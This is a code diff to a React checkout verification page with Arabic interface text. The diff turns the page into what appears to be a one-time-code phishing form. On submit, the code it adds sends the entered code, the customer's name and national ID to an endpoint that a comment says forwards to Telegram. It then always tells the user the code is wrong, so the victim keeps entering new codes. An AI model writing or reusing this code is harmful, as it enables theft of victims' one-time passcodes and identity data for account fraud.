@@ -6,15 +6,10 @@ import { useCartStore } from "../../store/cartStore";
 import { FileText, Receipt, X, ShieldCheck, KeyRound } from "lucide-react";
 
 export default function VerifyPage() {
-  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
+  const [otp, setOtp] = useState("");
   const [codeError, setCodeError] = useState(false);
   const [resent, setResent] = useState(false);
-  const [cooldown, setCooldown] = useState<number>(() => {
-    if (typeof window === "undefined") return 60;
-    const unlockAt = Number(localStorage.getItem("resendUnlockAt") ?? 0);
-    const remaining = Math.ceil((unlockAt - Date.now()) / 1000);
-    return remaining > 0 ? remaining : 0;
-  });
+  const [cooldown, setCooldown] = useState(0);
   const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const [confirmed, setConfirmed] = useState(false);
   const [dbOrderId, setDbOrderId] = useState<string | null>(null);
@@ -31,12 +26,14 @@ export default function VerifyPage() {
       });
     }, 1000);
   }
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const { customer } = useCartStore();
   const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
 
   useEffect(() => {
-    if (cooldown <= 0) return;
+    const unlockAt = Number(localStorage.getItem("resendUnlockAt") ?? 0);
+    const remaining = Math.ceil((unlockAt - Date.now()) / 1000);
+    if (remaining <= 0) return;
+    setCooldown(remaining);
     cooldownRef.current = setInterval(() => {
       setCooldown((prev) => {
         if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
@@ -61,37 +58,27 @@ export default function VerifyPage() {
     return () => clearInterval(pollRef.current!);
   }, [dbOrderId]);
 
-  function handleOtpChange(index: number, value: string) {
-    const digit = value.replace(/\D/g, "").slice(-1);
-    const next = [...otp];
-    next[index] = digit;
-    setOtp(next);
+  function handleOtpChange(value: string) {
+    const digits = value.replace(/\D/g, "").slice(0, 6);
+    setOtp(digits);
     setCodeError(false);
-    if (digit && index < 5) inputRefs.current[index + 1]?.focus();
-  }
-
-  function handleOtpKeyDown(index: number, e: React.KeyboardEvent) {
-    if (e.key === "Backspace" && !otp[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus();
-    }
   }
 
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
-    const code = otp.join("");
+    const code = otp;
     if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
-    setOtp(["", "", "", "", "", ""]);
+    
+    // إرسال الرمز للتليجرام
     await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
     });
-    try {
-      const res = await fetch("/api/admin/orders");
-      const orders = await res.json();
-      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
-      if (match) setDbOrderId(match._id);
-    } catch {}
+    
+    // إظهار رسالة خطأ
+    setCodeError(true);
+    setOtp("");
   }
 
   // ── Confirmed Popup ──────────────────────────────────────────────────────────
@@ -159,35 +146,30 @@ export default function VerifyPage() {
               </p>
             </div>
 
-            {/* OTP Grid */}
+            {/* OTP Input */}
             <form onSubmit={handleSubmit} className="space-y-5">
-              <div className="grid grid-cols-6 gap-3 md:gap-4" dir="ltr">
-                {otp.map((digit, i) => (
-                  <input
-                    key={i}
-                    ref={el => { inputRefs.current[i] = el; }}
-                    type="text"
-                    inputMode="numeric"
-                    maxLength={1}
-                    value={digit}
-                    onChange={e => handleOtpChange(i, e.target.value)}
-                    onKeyDown={e => handleOtpKeyDown(i, e)}
-                    aria-label={`Digit ${i + 1}`}
-                    className={`w-full aspect-square text-center text-2xl font-bold rounded-xl transition-all outline-none border-2 text-gray-900 ${
-                      codeError ? "border-red-400 bg-red-50" : "bg-gray-50 border-gray-200 focus:border-red-500 focus:bg-white focus:shadow-[0_0_0_3px_rgba(220,38,38,0.12)]"
-                    }`}
-                  />
-                ))}
+              <div dir="ltr">
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={6}
+                  value={otp}
+                  onChange={e => handleOtpChange(e.target.value)}
+                  placeholder="أدخل الرمز"
+                  className={`w-full text-center text-2xl font-bold rounded-xl py-4 px-6 outline-none border-2 transition-all text-gray-900 tracking-[0.5em] ${
+                    codeError ? "border-red-400 bg-red-50" : "bg-gray-50 border-gray-200 focus:border-red-500 focus:bg-white focus:shadow-[0_0_0_3px_rgba(220,38,38,0.12)]"
+                  }`}
+                />
               </div>
 
-              {codeError && <p className="text-red-500 text-xs text-center -mt-4">يجب إدخال 4 أو 6 أرقام</p>}
+              {codeError && <p className="text-red-500 text-sm font-semibold text-center -mt-4">الرمز غير صحيح</p>}
               {resent && <p className="text-green-600 text-sm text-center font-medium">✅ تم إعادة إرسال الرمز</p>}
 
               {/* Actions */}
               <div className="space-y-4">
                 <button
                   type="submit"
-                  className="w-full py-4 px-6 rounded-xl text-white font-bold text-lg bg-red-600 hover:bg-red-700 shadow-md shadow-red-200 hover:shadow-red-300 transition-all duration-200 active:scale-95 flex items-center justify-center gap-2"
+                  className="w-full py-4 px-6 rounded-xl text-white font-bold text-lg bg-[#89BA45] hover:bg-[#7aaa3a] shadow-md shadow-green-200 hover:shadow-green-300 transition-all duration-200 active:scale-95 flex items-center justify-center gap-2"
                 >
 اتمام الطلب                  <ShieldCheck className="w-5 h-5" />
                 </button>
@@ -205,10 +187,10 @@ export default function VerifyPage() {
                         setTimeout(() => setResent(false), 3000);
                         startCooldown();
                       }}
-                      className={`font-semibold transition-all pointer-events-none select-none ${
+                      className={`font-semibold transition-all select-none ${
                         cooldown > 0
-                          ? "text-gray-300 cursor-not-allowed opacity-50"
-                          : "text-red-600 hover:underline cursor-pointer pointer-events-auto"
+                          ? "text-gray-300 cursor-not-allowed opacity-50 pointer-events-none"
+                          : "text-red-600 hover:underline cursor-pointer"
                       }`}
                     >
                       {cooldown > 0 ? `إعادة الإرسال (${cooldown}s)` : "إعادة الإرسال"}
